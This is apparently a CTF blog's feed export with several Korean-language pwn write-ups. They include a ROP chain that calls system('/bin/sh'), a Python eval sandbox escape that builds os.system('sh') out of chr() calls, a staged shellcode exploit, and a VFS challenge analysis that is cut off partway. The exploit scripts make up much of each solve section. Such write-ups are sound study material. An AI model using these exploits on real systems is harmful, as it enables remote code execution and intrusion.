class="string">&#x27;gets&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(leave_ret) <span class="comment"># for stack pivoting</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># push_rsp_ret = libc.address + 0x4181d</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dead&#123;I_w4nn4_b3_4_s41ky0u_H3R00000000&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> DeadSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack pivoting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TBCL CTF 2023 - Math is Hard (python, eval)</title>
      <link href="/230524-tbclctf2023-math_is_hard/"/>
      <url>/230524-tbclctf2023-math_is_hard/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2002">https://ctftime.org/event/2002</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; ? points]</li></ul><p>바로 지난 주말에 치뤄진 대회인데 challenge가 모두 내려가서 문제 정보를 알 수가 없다 ㅜㅜ</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>문제는 python 스크립트 하나만 주어진다. calc.py<br>python 스크립트만 주어지는 문제는 항상 긴장된다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">USAGE = <span class="string">&quot;&quot;&quot;PwnCalc -- a simple calculator</span></span><br><span class="line"><span class="string">$ a=4</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>a = 4</span></span><br><span class="line"><span class="string">$ a = 4</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>a = 4</span></span><br><span class="line"><span class="string">$ b = 3</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>b = 3</span></span><br><span class="line"><span class="string">$ c = sqrt(a*a+b*b)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>c = 5.0</span></span><br><span class="line"><span class="string">$ d = sin(pi/4)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>d = 0.7071067811865475</span></span><br><span class="line"><span class="string">Have fun!</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_expression</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Allow only digits, decimal point, lowecase letters and math symbols.&quot;&quot;&quot;</span></span><br><span class="line">    SYMBOLS = <span class="string">&quot;.+*-/()&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> c.islower() <span class="keyword">and</span> <span class="keyword">not</span> c.isdigit() <span class="keyword">and</span> c <span class="keyword">not</span> <span class="keyword">in</span> SYMBOLS:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loop</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Main calculator loop.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">vars</span> = &#123; c : <span class="number">0</span> <span class="keyword">for</span> c <span class="keyword">in</span> ascii_lowercase &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        line = <span class="built_in">input</span>(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Bye!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        items = line.split(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(items) != <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid syntax!&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        varname, expression = items</span><br><span class="line">        varname = varname.strip()</span><br><span class="line">        expression = expression.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(varname) != <span class="number">1</span> <span class="keyword">or</span> <span class="keyword">not</span> varname.islower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid variable name!&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_expression(expression):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid character in expression!&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        result = <span class="built_in">eval</span>(expression, <span class="built_in">vars</span>, &#123;<span class="string">&#x27;sin&#x27;</span>: sin, <span class="string">&#x27;cos&#x27;</span>: cos, <span class="string">&#x27;sqrt&#x27;</span>: sqrt, <span class="string">&#x27;exp&#x27;</span>: exp, <span class="string">&#x27;log&#x27;</span>: log, <span class="string">&#x27;pi&#x27;</span>: pi&#125;)</span><br><span class="line">        <span class="built_in">vars</span>[varname] = result</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &#123;&#125; = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(varname, result))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(USAGE)</span><br><span class="line">    loop()</span><br></pre></td></tr></table></figure><p><code>result = eval(expression, vars, &#123;&#39;sin&#39;: sin, &#39;cos&#39;: cos, &#39;sqrt&#39;: sqrt, &#39;exp&#39;: exp, &#39;log&#39;: log, &#39;pi&#39;: pi&#125;)</code> 에서 <code>eval</code> 함수를 사용해서 취약점이 발생할 수 있다.</p><p><code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code> 을 실행시키고 싶다. 이를 위해 <code>eval(__import__(&#39;os&#39;).system(&#39;sh&#39;))</code>을 서버에서 실행시키고 싶었다. 이때 문제는 <code>.+*-/()</code>만 허용해서 <code>&#39;</code>을 사용할 수가 없다. 이를 위해 <code>eval</code>과 <code>chr</code>을 사용했고 이걸 로컬이 아닌 서버에서 실행시키도록 노력했다. payload를 로컬에서 실행시킬 때 에러 없이 원하는 행위를 실행시킬 수 있어야 한다. 이게 그대로 서버에서 실행된다고 생각하면 된다.</p><p><code>python eval</code> 취약점에 대한 자세한 내용은 아래 블로그를 참고했다.</p><ul><li><a href="https://passwd.tistory.com/entry/eval-%EB%AC%B8%EC%9E%90%EC%97%B4-%EC%8B%9D-%EC%8B%A4%ED%96%89">https://passwd.tistory.com/entry/eval-%EB%AC%B8%EC%9E%90%EC%97%B4-%EC%8B%9D-%EC%8B%A4%ED%96%89</a></li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&#x27;python&#x27;, &#x27;./calc.py&#x27;])</span></span><br><span class="line">p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">19815</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;__import__(\&#x27;os\&#x27;).system(\&#x27;sh\&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a = &#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;eval(&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">    payload += <span class="string">&#x27;chr(&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(c)) + <span class="string">&#x27;)+&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload[:-<span class="number">1</span>]</span><br><span class="line">payload += <span class="string">&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;$&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TBTL&#123;4Nd_54nd80x1n6_15_3v3n_h4rd3r&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> TBCL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> eval </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BYU CTF 2023 review</title>
      <link href="/230523-byuctf2023-0review/"/>
      <url>/230523-byuctf2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1935">https://ctftime.org/event/1935</a></li><li><a href="https://github.com/BYU-CSA/BYUCTF-2023/tree/main">https://github.com/BYU-CSA/BYUCTF-2023/tree/main</a></li></ul><p>저번 주말에 씨텝이 참 많이 열렸다. 사실 요즘 게임에 빠져있어서 게임 던전 잡히는 동안 다른 씨텝 문제를 틈틈히 풀어보고 이 씨텝은 주말에 씨텝 끝나고 월요일에 다 풀어봤다. 솔브 수도 타 씨텝보다 높은 편이길래(hard라고 표기된 솔브 수 가장 적은 포너블이 45솔브였음) 못 풀면 어떡하나 긴장하면서 풀었다. 다행히 다 풀어서 기분이 좋았다. </p><p>그러나 공식 깃허브에는 바이너리가 하나 더 있었고, 한 바이너리에 3개의 플래그가 숨겨져 있었다.(공식 깃허브에 세 문제가 더 있었다.) 하나는 찾았고, 취약점도 찾았으나 스택을 다 뒤져야하는… 브포를 해야할 것 같아서 일단 다른 우선순위가 높은 일을 하러 갔고.. 지금은 후기와 롸업부터 쓴다. ㄱ-</p><ul><li><a href="https://jiravvit.github.io/230523-byuctf2023-2038/">https://jiravvit.github.io/230523-byuctf2023-2038/</a></li><li><a href="https://jiravvit.github.io/230523-byuctf2023-vfs1/">https://jiravvit.github.io/230523-byuctf2023-vfs1/</a></li><li><a href="https://jiravvit.github.io/230523-byuctf2023-shellcode/">https://jiravvit.github.io/230523-byuctf2023-shellcode/</a></li><li><a href="https://jiravvit.github.io/230523-byuctf2023-frorg/">https://jiravvit.github.io/230523-byuctf2023-frorg/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> BYU </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BYU CTF 2023 - Shellcode (shellcode)</title>
      <link href="/230523-byuctf2023-shellcode/"/>
      <url>/230523-byuctf2023-shellcode/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1935">https://ctftime.org/event/1935</a></li></ul><blockquote><p>You’ll have to make your own shellcode for this one!<br>nc byuctf.xyz 40017<br>tag: medium </p></blockquote><ul><li>[51 solves &#x2F; 452 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>소스 코드가 주어져 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_ANONYMOUS 0x20</span></span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">flush_buf</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// create memory for shellcode to reside in</span></span><br><span class="line">    mmap((<span class="type">char</span> *)<span class="number">0x777777000</span>, <span class="number">71</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set first 51 bytes to 0s</span></span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span> *)<span class="number">0x777777000</span>, <span class="number">0x00</span>, <span class="number">51</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get first 10 bytes of shellcode</span></span><br><span class="line">    <span class="type">char</span> shellcode_one[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter first 10 bytes of shellcode: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, shellcode_one, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)<span class="number">0x777777000</span>, shellcode_one, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get second 10 bytes of shellcode</span></span><br><span class="line">    <span class="type">char</span> shellcode_two[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter second 10 bytes of shellcode: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, shellcode_two, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)<span class="number">0x777777020</span>, shellcode_two, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get third 10 bytes of shellcode</span></span><br><span class="line">    <span class="type">char</span> shellcode_three[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter third 10 bytes of shellcode: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, shellcode_three, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)<span class="number">0x777777040</span>, shellcode_three, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get last 10 bytes of shellcode</span></span><br><span class="line">    <span class="type">char</span> shellcode_four[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter last 10 bytes of shellcode: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, shellcode_four, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)<span class="number">0x777777060</span>, shellcode_four, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// call shellcode</span></span><br><span class="line">    ((<span class="type">void</span> (*)())<span class="number">0x777777000</span>)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x777777000 주소부터 실행권한을 주었다. 그리고 10바이트씩 shellcode를 입력한다. 이때 10바이트 null이 생긴다. 마지막엔 0x777777000을 실행시킨다. 바로 든 생각은 처음에 shellcode를 입력할 때 <code>read(0, 0x777777000, size)</code> syscall을 입력하면 10바이트 띄엄띄엄 입력하는 한계를 없앨 수 있겠다고 생각했다. 단 내가 가장 실행하고 싶은 syscall이 10바이트 이내여야 한다.</p><p>다행히 마지막 call shellcode를 할 때 레지스터 상황은 아래와 같았고, <code>mov rsi, rdx</code>와 <code>syscall</code>을 실행시킴으로써 내 의도대로 문제를 풀 수 있었다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$rax   : 0x0  </span><br><span class="line">$rdi   : 0x0   </span><br><span class="line">$rsi   : 0x007fffffffe58e  →  0x00000a64646464 (&quot;dddd\n&quot;?)</span><br><span class="line">$rdx   : 0x00000777777000  →  0x00000a61616161 (&quot;aaaa\n&quot;?)</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># $rax   : 0x0  </span></span><br><span class="line"><span class="comment"># $rdi   : 0x0   </span></span><br><span class="line"><span class="comment"># $rsi   : 0x007fffffffe58e  →  0x00000a64646464 (&quot;dddd\n&quot;?)</span></span><br><span class="line"><span class="comment"># $rdx   : 0x00000777777000  →  0x00000a61616161 (&quot;aaaa\n&quot;?)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 bytes</span></span><br><span class="line"><span class="comment"># read(0, 0x00000777777000,)</span></span><br><span class="line">shellcode_one = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsi, rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(asm(shellcode_one)) </span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, asm(shellcode_one)) </span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, p64(<span class="number">0</span>)) </span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, p64(<span class="number">0</span>)) </span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, p64(<span class="number">0</span>)) </span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span> + asm(shellcode))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> BYU </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BYU CTF 2023 - VFS 1 (printf null)</title>
      <link href="/230523-byuctf2023-vfs1/"/>
      <url>/230523-byuctf2023-vfs1/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1935">https://ctftime.org/event/1935</a></li></ul><blockquote><p>I’ve decided that we don’t virtualize things enough, so I created a virtual file system that you can run and save your secrets on. This is still in beta-testing, but let me know what you think!<br>nc byuctf.xyz 40008<br>tag: medium </p></blockquote><ul><li>[80 solves &#x2F; 381 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>소스 코드가 주어져서 중요한 부분만 가져왔다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// INITIALIZATIONS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">filesystem</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> contents[<span class="number">2880</span>];</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">64</span>];</span><br><span class="line">    <span class="type">int</span> current_file;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (buffer) &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(fs.flag, buffer); <span class="comment">// flag를 복사 </span></span><br><span class="line">    <span class="built_in">free</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">fs.current_file = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> filename[<span class="number">32</span>];</span><br><span class="line"><span class="type">char</span> contents[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>==<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">int</span> choice = menu();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fs.current_file == <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Sorry, you can&#x27;t create any more files!&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// create</span></span><br><span class="line">    </span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] What would you like to name your file?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%32s&quot;</span>, filename);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] What would you like to put in your file?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%256s&quot;</span>, contents);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// copy filename</span></span><br><span class="line">        <span class="built_in">memcpy</span>(fs.contents + (fs.current_file*<span class="number">288</span>), filename, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// copy contents</span></span><br><span class="line">        <span class="built_in">memcpy</span>(fs.contents + (fs.current_file*<span class="number">288</span>) + <span class="number">32</span>, contents, <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] File created! (#%d)\n\n&quot;</span>, fs.current_file);</span><br><span class="line">        fs.current_file++;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="comment">// read</span></span><br><span class="line">        <span class="type">int</span> file_to_read;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Which file # would you like to read?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;file_to_read);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((file_to_read &gt;= fs.current_file) || (file_to_read &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid file number&quot;</span>);</span><br><span class="line">            <span 